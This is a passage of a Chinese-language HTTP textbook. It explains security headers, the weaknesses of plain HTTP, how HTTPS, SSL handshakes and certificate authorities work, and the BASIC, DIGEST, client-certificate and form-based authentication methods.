的配置实例<ifmodule mod_headers.c="">132 Header append X-FRAME-OPTIONS “SAMEORIGIN”</ifmodule>6.8.2　X-XSS-ProtectionX-XSS-Protection: 1首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。首部字段 X-XSS-Protection 可指定的字段值如下。0 ：将 XSS 过滤设置成无效状态1 ：将 XSS 过滤设置成有效状态6.8.3　DNTDNT: 1首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。首部字段 DNT 可指定的字段值如下。0 ：同意被追踪1 ：拒绝被追踪由于首部字段 DNT 的功能具备有效性，所以 Web 服务器需要对 DNT做对应的支持。1336.8.4　P3PP3P: CP=”CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa OUR BUS I首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform forPrivacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。要进行 P3P 的设定，需按以下操作步骤进行。步骤 1：创建 P3P 隐私步骤 2：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml步骤 3：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中有关 P3P 的详细规范标准请参看下方链接。The Platform for Privacy Preferences 1.0（P3P1.0）Specification<a href="http://www.w3.org/TR/P3P/协议中对" target="_blank" rel="noopener">http://www.w3.org/TR/P3P/协议中对</a> X- 前缀的废除在 HTTP 等多种协议中，通过给非标准参数加上前缀 X-，来区别于标准参数，并使那些非标准的参数作为扩展变成可能。但是这种简单粗暴的做法有百害而无一益，因此在“RFC 6648 - Deprecatingthe “X-“ Prefix and Similar Constructs in Application Protocols”中提议停止该做法。然而，对已经在使用中的 X- 前缀来说，不应该要求其变更。134第 7 章　确保 Web 安全的HTTPS在 HTTP 协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS 通信机制可以有效地防止这些问题。本章我们就了解一下HTTPS。7.1　HTTP 的缺点到现在为止，我们已了解到 HTTP 具有相当优秀和方便的一面，然而HTTP 并非只有好的一面，事物皆具两面性，它也是有不足之处的。HTTP 主要有这些不足，例举如下。通信使用明文（不加密），内容可能会被窃听不验证通信方的身份，因此有可能遭遇伪装无法证明报文的完整性，所以有可能已遭篡改135这些问题不仅在 HTTP 上出现，其他未加密的协议中也会存在这类问题。除此之外，HTTP 本身还有很多缺点。而且，还有像某些特定的 Web服务器和特定的 Web 浏览器在实际应用中存在的不足（也可以说成是脆弱性或安全漏洞），另外，用 Java 和 PHP 等编程语言开发的Web 应用也可能存在安全漏洞。7.1.1　通信使用明文可能会被窃听由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。TCP/IP 是可能被窃听的网络如果要问为什么通信时不加密是一个缺点，这是因为，按TCP/IP 协议族的工作机制，通信内容在所有的通信线路上都有可能遭到窥视。所谓互联网，是由能连通到全世界的网络组成的。无论世界哪个角落的服务器在和客户端通信时，在此通信线路上的某些网络设备、光缆、计算机等都不可能是个人的私有物，所以不排除某个环节中会遭到恶意窥视行为。即使已经过加密处理的通信，也会被窥视到通信内容，这点和未加密的通信是相同的。只是说如果通信经过加密，就有可能让人无法破解报文信息的含义，但加密处理后的报文信息本身还是会被看到的。136图：互联网上的任何角落都存在通信内容被窃听的风险窃听相同段上的通信并非难事。只需要收集在互联网上流动的数据包（帧）就行了。对于收集来的数据包的解析工作，可交给那些抓包（Packet Capture）或嗅探器（Sniffer）工具。下面的图片示例就是被广泛使用的抓包工具 Wireshark。它可以获取 HTTP 协议的请求和响应的内容，并对其进行解析。像使用 GET 方法发送请求、响应返回了 200 OK，查看 HTTP 响应报文的全部内容等一系列的事情都可以做到。图：Wireshark（<a href="http://www.wireshark.org/）加密处理防止被窃听在目前大家正在研究的如何防止窃听保护信息的几种对策中，最为普及的就是加密技术。加密的对象可以有这么几个。通信的加密一种方式就是将通信加密。HTTP" target="_blank" rel="noopener">http://www.wireshark.org/）加密处理防止被窃听在目前大家正在研究的如何防止窃听保护信息的几种对策中，最为普及的就是加密技术。加密的对象可以有这么几个。通信的加密一种方式就是将通信加密。HTTP</a> 协议中没有加密机制，但可以137通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用，加密 HTTP 的通信内容。用 SSL 建立安全通信线路之后，就可以在这条线路上进行 HTTP通信了。与 SSL 组合使用的 HTTP 被称为 HTTPS（HTTPSecure，超文本传输安全协议）或 HTTP over SSL。内容的加密还有一种将参与通信的内容本身加密的方式。由于 HTTP 协议中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把HTTP 报文里所含的内容进行加密处理。在这种情况下，客户端需要对 HTTP 报文进行加密处理后再发送请求。诚然，为了做到有效的内容加密，前提是要求客户端和服务器同时具备加密和解密机制。主要应用在 Web 服务中。有一点必须138引起注意，由于该方式不同于 SSL 或 TLS 将整个通信线路加密处理，所以内容仍有被篡改的风险。稍后我们会加以说明。7.1.2　不验证通信方的身份就可能遭遇伪装HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。任何人都可发起请求在 HTTP 协议通信时，由于不存在确认通信方的处理步骤，任何人都可以发起请求。另外，服务器只要接收到请求，不管对方是谁都会返回一个响应（但也仅限于发送端的 IP 地址和端口号没有被 Web 服务器设定限制访问的前提下）。HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应，因此不确认通信方，会存在以下各种隐患。无法确定请求发送至目标的 Web 服务器是否是按真实意图返回响应的那台服务器。有可能是已伪装的 Web 服务器。无法确定响应返回到的客户端是否是按真实意图接收响应的那个客户端。有可能是已伪装的客户端。无法确定正在通信的对方是否具备访问权限。因为某些Web 服务器上保存着重要的信息，只想发给特定用户通信的权限。139无法判定请求是来自何方、出自谁手。即使是无意义的请求也会照单全收。无法阻止海量请求下的 DoS 攻击（Denial of Service，拒绝服务攻击）。查明对手的证书虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段，可用于确定方。证书由值得信任的第三方机构颁发，用以证明服务器和客户端是实际存在的。另外，伪造证书从技术角度来说是异常困难的一件事。所以只要能够确认通信方（服务器或客户端）持有的证书，即可判断通信方的真实意图。通过使用证书，以证明通信方就是意料中的服务器。这对使用者个人来讲，也减少了个人信息泄露的危险性。另外，客户端持有证书即可完成个人身份的确认，也可用于对Web 网站的认证环节。7.1.3　无法证明报文完整性，可能已遭篡改所谓完整性是指信息的准确度。若无法证明其完整性，通常也就意味着无法判断信息是否准确。140接收到的内容可能有误由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。换句话说，没有任何办法确认，发出的请求 / 响应和接收到的请求 / 响应是前后相同的。比如，从某个 Web 网站上下载内容，是无法确定客户端下载的文件和服务器上存放的文件是否前后一致的。文件内容在传输途中可能已经被篡改为其他的内容。即使内容真的已改变，作为接收方的客户端也是觉察不到的。像这样，请求或响应在传输途中，遭攻击者拦截并篡改内容的攻击称为中间人攻击（Man-in-the-Middle attack，MITM）。图：中间人攻击如何防止篡改141虽然有使用 HTTP 协议确定报文完整性的方法，但事实上并不便捷、可靠。其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法。提供文件下载服务的 Web 网站也会提供相应的以 PGP（PrettyGood Privacy，完美隐私）创建的数字签名及 MD5 算法生成的散列值。PGP 是用来证明创建文件的数字签名，MD5 是由单向函数生成的散列值。不论使用哪一种方法，都需要操纵客户端的用户本人亲自检查验证下载的文件是否就是原来服务器上的文件。浏览器无法自动帮用户检查。可惜的是，用这些方法也依然无法百分百保证确认结果正确。因为 PGP 和 MD5 本身被改写的话，用户是没有办法意识到的。为了有效防止这些弊端，有必要使用 HTTPS。SSL 提供认证和加密处理及摘要功能。仅靠 HTTP 确保完整性是非常困难的，因此通过和其他协议组合使用来实现这个目标。下节我们介绍HTTPS 的相关内容。7.2　HTTP+ 加密 + 认证 + 完整性保护=HTTPS7.2.1　HTTP 加上加密处理和认证以及完整性保护后即是HTTPS如果在 HTTP 协议通信过程中使用未经加密的明文，比如在 Web 页面中输入信用卡号，如果这条通信线路遭到窃听，那么信用卡号就暴露了。另外，对于 HTTP 来说，服务器也好，客户端也好，都是没有办法确142认通信方的。因为很有可能并不是和原本预想的通信方在实际通信。并且还需要考虑到接收到的报文在通信途中已经遭到篡改这一可能性。为了统一解决上述这些问题，需要在 HTTP 上再加入加密处理和认证等机制。我们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTPSecure）。图：使用 HTTPS 通信经常会在 Web 的登录页面和购物结算界面等使用 HTTPS 通信。使用HTTPS 通信时，不再用 http://，而是改用 https://。另外，当浏览器访问 HTTPS 通信有效的 Web 网站时，浏览器的地址栏内会出现一个带锁的标记。对 HTTPS 的显示方式会因浏览器的不同而有所改变。1437.2.2　HTTPS 是身披 SSL 外壳的 HTTPHTTPS 并非是应用层的一种新协议。只是 HTTP 通信接口部分用SSL（Secure Socket Layer）和 TLS（Transport Layer Security）协议代替而已。通常，HTTP 直接和 TCP 通信。当使用 SSL 时，则演变成先和 SSL 通信，再由 SSL 和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披SSL 协议这层外壳的 HTTP。在采用 SSL 后，HTTP 就拥有了 HTTPS 的加密、证书和完整性保护这些功能。144SSL 是独立于 HTTP 的协议，所以不光是 HTTP 协议，其他运行在应用层的 SMTP 和 Telnet 等协议均可配合 SSL 协议使用。可以说 SSL 是当今世界上应用最为广泛的网络安全技术。7.2.3　相互交换密钥的公开密钥加密技术在对 SSL 进行讲解之前，我们先来了解一下加密方法。SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。近代的加密方法中加密算法是公开的，而密钥却是保密的。通过这种方式得以保持加密方法的安全性。加密和解密都会用到密钥。没有密钥就无法对密码解密，反过来说，任何人只要持有密钥就能解密了。如果密钥被攻击者获得，那加密也就失去了意义。共享密钥加密的困境加密和解密同用一个密钥的方式称为共享密钥加密（Common keycrypto system），也被叫做对称密钥加密。以共享密钥方式加密时必须将密钥也发给对方。可究竟怎样才能安全地转交？在互联网上转发密钥时，如果通信被监听那么密钥就可会落入攻击者之手，同时也就失去了加密的意义。另外还得设法安全地保管接收到的密钥。145图：密钥发送问题使用两把密钥的公开密钥加密公开密钥加密方式很好地解决了共享密钥加密的困难。公开密钥加密使用一对非对称的密钥。一把叫做私有密钥（private key），另一把叫做公开密钥（public key）。顾名思义，私有密钥不能让其他任何人知道，而公开密钥则可以随意发布，任何人都可以获得。使用公开密钥加密方式，发送密文的一方使用对方的公开密钥进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。利用这种方式，不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走。另外，要想根据密文和公开密钥，恢复到信息原文是异常困难的，因为解密过程就是在对离散对数进行求值，这并非轻而易举就能办到。退一步讲，如果能对一个非常大的整数做到快速地因式分解，那么密码破解还是存在希望的。但就目前的技术来看是不太现实的。146HTTPS 采用混合加密机制HTTPS 采用共享密钥加密和公开密钥加密两者并用的混合加密机制。若密钥能够实现安全交换，那么有可能会考虑仅使用公开密钥加密来通信。但是公开密钥加密与共享密钥加密相比，其处理速度要慢。所以应充分利用两者各自的优势，将多种方法组合起来用于通信。在交换密钥环节使用公开密钥加密方式，之后的建立通信交换报文阶段则使用共享密钥加密方式。147图：混合加密机制7.2.4　证明公开密钥正确性的证书遗憾的是，公开密钥加密方式还是存在一些问题的。那就是无法证明公开密钥本身就是货真价实的公开密钥。比如，正准备和某台服务器建立公开密钥加密方式下的通信时，如何证明收到的公开密钥就是原本预想的那台服务器发行的公开密钥。或许在公开密钥传输途中，真正的公开密钥已经被攻击者替换掉了。为了解决上述问题，可以使用由数字证书认证机构（CA，CertificateAuthority）和其相关机关颁发的公开密钥证书。数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上。威瑞信（VeriSign）就是其中一家非常有名的数字证书认证机构。我们来介绍一下数字证书认证机构的业务流程。首先，服务器的运营人员向数字证书认证机构提出公开密钥的申请。数字证书认证机构在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公钥证书后绑定在一起。服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端，148以进行公开密钥加密方式通信。公钥证书也可叫做数字证书或直接称为证书。接到证书的客户端可使用数字证书认证机构的公开密钥，对那张证书上的数字签名进行验证，一旦验证通过，客户端便可明确两件事：一，认证服务器的公开密钥的是真实有效的数字证书认证机构。二，服务器的公开密钥是值得信赖的。此处认证机关的公开密钥必须安全地转交给客户端。使用通信方式时，如何安全转交是一件很困难的事，因此，多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥。149150可证明组织真实性的 EV SSL 证书证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用是可确认对方服务器背后运营的企业是否真实存在。拥有该特性的证书就是 EV SSL 证书（Extended Validation SSLCertificate）。EV SSL 证书是基于国际标准的认证指导方针颁发的证书。其严格规定了对运营组织是否真实的确认方针，因此，通过认证的Web 网站能够获得更高的认可度。持有 EV SSL 证书的 Web 网站的浏览器地址栏处的背景色是绿色的，从视觉上就能一眼辨别出。而且在地址栏的左侧显示了 SSL证书中记录的组织名称以及颁发证书的认证机构的名称。上述机制的原意图是为了防止用户被钓鱼攻击（Phishing），但就效果上来讲，还得打一个问号。很多用户可能不了解 EV SSL证书相关的知识，因此也不太会留意它。用以确认客户端的客户端证书HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，其作用跟服务器证书如出一辙。但客户端证书仍存在几处问题点。其中的一个问题点是证书的获取及发布。想获取证书时，用户得自行安装客户端证书。但由于客户端证书是要付费购买的，且每张证书对应到每位用户也就意味着需支付和用户数对等的费用。另外，要让知识层次不同的用户们自行安装证书，这件事本身也充满了各种挑战。现状是，安全性极高的认证机构可颁发客户端证书但仅用于特殊用途的业务。比如那些可支撑客户端证书支出费用的业务。例如，银行的网上银行就采用了客户端证书。在登录网银时不仅要求用户确认输入 ID 和密码，还会要求用户的客户端证书，以确认用户是否从特定的终端访问网银。151客户端证书存在的另一个问题点是，客户端证书毕竟只能用来证明客户端实际存在，而不能用来证明用户本人的真实有效性。也就是说，只要获得了安装有客户端证书的计算机的使用权限，也就意味着同时拥有了客户端证书的使用权限。认证机构信誉第一SSL 机制中介入认证机构之所以可行，是因为建立在其信用绝对可靠这一大前提下的。然而，2011 年 7 月，荷兰的一家名叫DigiNotar 的认证机构曾遭黑客不法入侵，颁布了 google.com 和twitter.com 等网站的伪造证书事件。这一事件从根本上撼动了SSL 的可信度。因为伪造证书上有正规认证机构的数字签名，所以浏览器会判定该证书是正当的。当伪造的证书被用做服务器伪装之时，用户根本无法察觉到。虽然存在可将证书无效化的证书吊销列表（Certificate RevocationList，CRL）机制，以及从客户端删除根证书颁发机构（RootCertificate Authority，RCA）的对策，但是距离生效还需要一段时间，而在这段时间内，到底会有多少用户的利益蒙受损失就不得而知了。由自认证机构颁发的证书称为自签名证书如果使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。但该服务器证书在互联网上不可作为证书使用，似乎没什么帮助。独立构建的认证机构叫做自认证机构，由自认证机构颁发的“无用”证书也被戏称为自签名证书。浏览器访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。152由自认证机构颁发的服务器证书之所以不起作用，是因为它无法消除伪装的可能性。自认证机构能够产生的作用顶多也就是自己对外宣称“我是○○”的这种程度。即使采用自签名证书，通过 SSL加密之后，可能偶尔还会看见通信处在安全状态的提示，可那也是有问题的。因为 就算加密通信，也不能排除正在和已经过伪装的假服务器保持通信。值得信赖的第三方机构介入认证，才能让已植入在浏览器内的认证机构颁布的公开密钥发挥作用，并借此证明服务器的真实性。中级认证机构的证书可能会变成自认证证书多数浏览器内预先已植入备受信赖的认证机构的证书，但也有一小部分浏览器会植入中级认证机构的证书。对于中级认证机构颁发的服务器证书，某些浏览器会以正规的证书来对待，可有的浏览器会当作自签名证书。7.2.5　HTTPS 的安全通信机制为了更好地理解 HTTPS，我们来观察一下 HTTPS 的通信步骤。153图：HTTPS 通信步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应154答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。步骤 5： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-mastersecret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。步骤 8： 服务器同样发送 Change Cipher Spec 报文。步骤 9： 服务器同样发送 Finished 报文。步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。步骤 11： 应用层协议通信，即发送 HTTP 响应。步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP的通信。在以上流程中，应用层发送数据时会附加一种叫做 MAC（MessageAuthentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。下面是对整个流程的图解。图中说明了从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程。1551 CBC 模式（Cipher Block Chaining）又名密码分组链接模式。在此模式下，将前一个明文块加密处理后和下一个明文块做 XOR 运算，使之重叠，然后再对运算结果做加密处理。对第一个明文块做加密时，要么使用前一段密文的最后一块，要么利用外部生成的初始向量（initial vector，IV）。——译者注SSL 和 TLSHTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport LayerSecurity）这两个协议。SSL 技术最初是由浏览器开发商网景通信公司率先倡导的，开发过 SSL3.0 之前的版本。目前主导权已转移到 IETF（InternetEngineering Task Force，Internet 工程任务组）的手中。IETF 以 SSL3.0 为基准，后又制定了 TLS1.0、TLS1.1 和TLS1.2。TSL 是以 SSL 为原型开发的协议，有时会统一称该协议为 SSL。当前主流的版本是 SSL3.0 和 TLS1.0。由于 SSL1.0 协议在设计之初被发现出了问题，就没有实际投入使用。SSL2.0 也被发现存在问题，所以很多浏览器直接废除了该协议版本。SSL 速度慢吗156HTTPS 也存在一些问题，那就是当使用 SSL 时，它的处理速度会变慢。图：HTTPS 比 HTTP 要慢 2 到 100 倍SSL 的慢分两种。一种是指通信慢。另一种是指由于大量消耗CPU 及内存等资源，导致处理速度变慢。和使用 HTTP 相比，网络负载可能会变慢 2 到 100 倍。除去和TCP 连接、发送 HTTP 请求 • 响应以外，还必须进行 SSL 通信，因此整体上处理通信量不可避免会增加。另一点是 SSL 必须进行加密处理。在服务器和客户端都需要进行加密和解密的运算处理。因此从结果上讲，比起 HTTP 会更多地消耗服务器和客户端的硬件资源，导致负载增强。针对速度变慢这一问题，并没有根本性的解决方案，我们会使用SSL 加速器这种（专用服务器）硬件来改善该问题。该硬件为SSL 通信专用硬件，相对软件来讲，能够提高数倍 SSL 的计算速度。仅在 SSL 处理时发挥 SSL 加速器的功效，以分担负载。为什么不一直使用 HTTPS既然 HTTPS 那么安全可靠，那为何所有的 Web 网站不一直使用HTTPS ？其中一个原因是，因为与纯文本通信相比，加密通信会消耗更多的CPU 及内存资源。如果每次通信都加密，会消耗相当多的资源，平摊到一台计算机上时，能够处理的请求数量必定也会随之减少。157因此，如果是非敏感信息则使用 HTTP 通信，只有在包含个人信息等敏感数据时，才利用 HTTPS 加密通信。特别是每当那些访问量较多的 Web 网站在进行加密处理时，它们所承担着的负载不容小觑。在进行加密处理时，并非对所有内容都进行加密处理，而是仅在那些需要信息隐藏时才会加密，以节约资源。除此之外，想要节约购买证书的开销也是原因之一。要进行 HTTPS 通信，证书是必不可少的。而使用的证书必须向认证机构（CA）购买。证书价格可能会根据不同的认证机构略有不同。通常，一年的授权需要数万日元（现在一万日元大约折合 600人民币）。那些购买证书并不合算的服务以及一些个人网站，可能只会选择采用 HTTP 的通信方式。158第 8 章　确认访问用户身份的认证某些 Web 页面只想让特定的人浏览，或者干脆仅本人可见。为达到这个目标，必不可少的就是认证功能。下面我们一起来学习一下认证机制。8.1　何为认证计算机本身无法判断坐在显示器前的使用者的身份。进一步说，也无法确认网络的那头究竟有谁。可见，为了弄清究竟是谁在访问服务器，就得让对方的客户端自报家门。可是，就算正在访问服务器的对方声称自己是ueno，身份是否属实这点却也无从谈起。为确认 ueno 本人是否真的具有访问系统的权限，就需要核对“登录者本人才知道的信息”、“登录者本人才会有的信息”。核对的信息通常是指以下这些。159密码：只有本人才会知道的字符串信息。动态令牌：仅限本人持有的设备内显示的一次性密码。数字证书：仅限本人（终端）持有的信息。生物认证：指纹和虹膜等本人的生理信息。IC 卡等：仅限本人持有的信息。但是，即便对方是假冒的用户，只要能通过用户验证，那么计算机就会默认是出自本人的行为。因此，掌控机密信息的密码绝不能让他人得到，更不能轻易地就被破解出来。HTTP 使用的认证方式HTTP/1.1 使用的认证方式如下所示。BASIC 认证（基本认证）DIGEST 认证（摘要认证）SSL 客户端认证FormBase 认证（基于表单认证）此外，还有 Windows 统一认证（Keberos 认证、NTLM 认证），但本书不作讲解。8.2　BASIC 认证160BASIC 认证（基本认证）是从 HTTP/1.0 就定义的认证方式。即便是现在仍有一部分的网站会使用这种认证方式。是 Web 服务器与通信客户端之间进行的认证方式。BASIC 认证的认证步骤图：BASIC 认证概要步骤 1： 当请求的资源需要 BASIC 认证时，服务器会随状态码 401Authorization Required，返回带 WWW-Authenticate 首部字段的响应。该字段内包含认证的方式（BASIC） 及 Request-URI 安全域字符串（realm）。步骤 2： 接收到状态码 401 的客户端为了通过 BASIC 认证，需要将用户 ID 及密码发送给服务器。发送的字符串内容是由用户 ID 和密码构成，两者中间以冒号（:）连接后，再经过 Base64 编码处理。假设用户 ID 为 guest，密码是 guest，连接起来就会形成 guest:guest 这样的字符串。然后经过 Base64 编码，最后的结果即是Z3Vlc3Q6Z3Vlc3Q=。把这串字符串写入首部字段 Authorization 后，发送请求。当用户代理为浏览器时，用户仅需输入用户 ID 和密码即可，之后，浏览器会自动完成到 Base64 编码的转换工作。161步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会对认证信息的正确性进行验证。如验证通过，则返回一条包含 Request-URI资源的响应。BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，由于明文解码后就是用户 ID和密码，在 HTTP 等非加密通信的线路上进行 BASIC 认证的过程中，如果被人窃听，被盗的可能性极高。另外，除此之外想再进行一次 BASIC 认证时，一般的浏览器却无法实现认证注销操作，这也是问题之一。BASIC 认证使用上不够便捷灵活，且达不到多数 Web 网站期望的安全性等级，因此它并不常用。8.3　DIGEST 认证为弥补 BASIC 认证存在的弱点，从 HTTP/1.1 起就有了 DIGEST 认证。 DIGEST 认证同样使用质询 / 响应的方式（challenge/response），但不会像 BASIC 认证那样直接发送明文密码。所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。162因为发送给对方的只是响应摘要及由质询码产生的计算结果，所以比起 BASIC 认证，密码泄露的可能性就降低了。DIGEST 认证的认证步骤图：DIGEST 认证概要步骤 1： 请求需认证的资源时，服务器会随着状态码 401Authorization Required，返 回带 WWW-Authenticate 首部字段的响应。该字段内包含质问响应方式认证所需的临时质询码（随机数，nonce）。163首部字段 WWW-Authenticate 内必须包含 realm 和 nonce 这两个字段的信息。客户端就是依靠向服务器回送这两个值进行认证的。nonce 是一种每次随返回的 401 响应生成的任意随机字符串。该字符串通常推荐由 Base64 编码的十六进制数的组成形式，但实际内容依赖服务器的具体实现。步骤 2： 接收到 401 状态码的客户端，返回的响应中包含 DIGEST 认证必须的首部字段 Authorization 信息。首部字段 Authorization 内必须包含 username、realm、nonce、uri 和response 的字段信息。其中，realm 和 nonce 就是之前从服务器接收到的响应中的字段。username 是 realm 限定范围内可进行认证的用户名。uri（digest-uri）即 Request-URI 的值，但考虑到经代理转发后Request-URI 的值可能被修改，因此事先会复制一份副本保存在 uri内。response 也可叫做 Request-Digest，存放经过 MD5 运算后的密码字符串，形成响应码。响应中其他的实体请参见第 6 章的请求首部字段 Authorization。另外，有关 Request-Digest 的计算规则较复杂，有兴趣的读者不妨深入学习一下 RFC2617。步骤 3： 接收到包含首部字段 Authorization 请求的服务器，会确认认证信息的正确性。认证通过后则返回包含 Request-URI 资源的响应。并且这时会在首部字段 Authentication-Info 写入一些认证成功的相关信息。DIGEST 认证提供了高于 BASIC 认证的安全等级，但是和 HTTPS 的客户端认证相比仍旧很弱。DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。DIGEST 认证和 BASIC 认证一样，使用上不那么便捷灵活，且仍达不到多数 Web 网站对高度安全等级的追求标准。因此它的适用范围也有所受限。1648.4　SSL 客户端认证从使用用户 ID 和密码的认证方式方面来讲，只要二者的内容正确，即可认证是本人的行为。但如果用户 ID 和密码被盗，就很有可能被第三者冒充。利用 SSL 客户端认证则可以避免该情况的发生。SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书（在 HTTPS 一章已讲解）认证，服务器可确认访问是否来自已登录的客户端。8.4.1　SSL 客户端认证的认证步骤为达到 SSL 客户端认证的目的，需要事先将客户端证书分发给客户端，且客户端必须安装此证书。步骤 1： 接收到需要认证资源的请求，服务器会发送 CertificateRequest 报文，要求客户端提供客户端证书。步骤 2： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。图：选择客户端证书示例（三菱东京 UFJ 银行）步骤 3： 服务器验证客户端证书验证通过后方可领取证书内客户端的165公开密钥，然后开始 HTTPS 加密通信。8.4.2　SSL 客户端认证采用双因素认证在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证（稍后讲解）组合形成一种双因素认证（Two-factorauthentication）来使用。所谓双因素认证就是指，认证过程中不仅需要密码这一个因素，还需要申请认证者提供其他持有信息，从而作为另一个因素，与其组合使用的认证方式。换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机，另一个认证因素的密码则用来确定这是用户本人的行为。通过双因素认证后，就可以确认是用户本人正在使用匹配正确的计算机访问服务器。8.4.3　SSL 客户端认证必要的费用使用 SSL 客户端认证需要用到客户端证书。而客户端证书需要支付一定费用才能使用。这里提到的费用是指，从认证机构购买客户端证书的费用，以及服务器运营者为保证自己搭建的认证机构安全运营所产生的费用。每个认证机构颁发客户端证书的费用不尽相同，平摊到一张证书上，一年费用约几万至十几万日元。服务器运营者也可以自己搭建认证机构，但要维持安全运行就会产生相应的费用。8.5　基于表单认证基于表单的认证方法并不是在 HTTP 协议中定义的。客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。根据 Web 应用程序的实际安装，提供的用户界面及认证方式也各不相同。166图：基于表单认证示例（Google）多数情况下，输入已事先登录的用户 ID（通常是任意字符串或邮件地址）和密码等登录信息后，发送给 Web 应用程序，基于认证结果来决定认证是否成功。8.5.1　认证多半为基于表单认证由于使用上的便利性及安全性问题，HTTP 协议标准提供的 BASIC 认证和 DIGEST 认证几乎不怎么使用。另外，SSL 客户端认证虽然具有高度的安全等级，但因为导入及维持费用等问题，还尚未普及。比如 SSH 和 FTP 协议，服务器与客户端之间的认证是合乎标准规范的，并且满足了最基本的功能需求上的安全使用级别，因此这些协议的认证可以拿来直接使用。但是对于 Web 网站的认证功能，能够满足其安全使用级别的标准规范并不存在，所以只好使用由 Web 应用程序各自实现基于表单的认证方式。不具备共同标准规范的表单认证，在每个 Web 网站上都会有各不相同的实现方式。如果是全面考虑过安全性能而实现的表单认证，那么就能够具备高度的安全等级。但在表单认证的实现中存在问题的 Web网站也是屡见不鲜。1678.5.2　Session 管理及 Cookie 应用基于表单认证的标准规范尚未有定论，一般会使用 Cookie 来管理Session（会话）。基于表单认证本身是通过服务器端的 Web 应用，将客户端发送过来的用户 ID 和密码与之前登录过的信息做匹配来进行认证的。但鉴于 HTTP 是无状态协议，之前已认证成功的用户状态无法通过协议层面保存下来。即，无法实现状态管理，因此即使当该用户下一次继续访问，也无法区分他与其他的用户。于是我们会使用 Cookie 来管理 Session，以弥补 HTTP 协议中不存在的状态管理功能。图：Session 管理及 Cookie 状态管理步骤 1： 客户端把用户 ID 和密码等登录信息放入报文的实体部分，通常是以 POST 方法把请求发送给服务器。而这时，会使用 HTTPS通信来进行 HTML 表单画面的显示和用户输入数据的发送。步骤 2： 服务器会发放用以识别用户的 Session 